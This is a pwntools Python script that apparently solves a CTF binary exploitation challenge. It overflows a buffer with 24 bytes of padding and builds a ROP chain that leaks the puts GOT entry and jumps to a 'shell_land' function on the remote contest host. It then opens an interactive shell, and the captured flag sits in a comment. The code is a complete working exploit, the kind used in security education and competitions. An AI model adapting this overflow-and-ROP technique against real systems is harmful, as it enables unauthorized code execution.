from pwn import *
context.clear(arch='amd64')
elf = ELF('./chall')

rop = ROP(elf)

rop.raw("A" * 24)
# padding
rop.puts(elf.got['puts'])
rop.call(elf.symbols['shell_land'])
# p = process('./chall')
p = remote('tjc.tf',31680)
p.recvuntil(b"Where am I going today?\n")
# tjctf{wh4t_a_n1c3_plac3_ind33d!_7609d40aeba4844c}
p.send(rop.chain())
p.interactive()
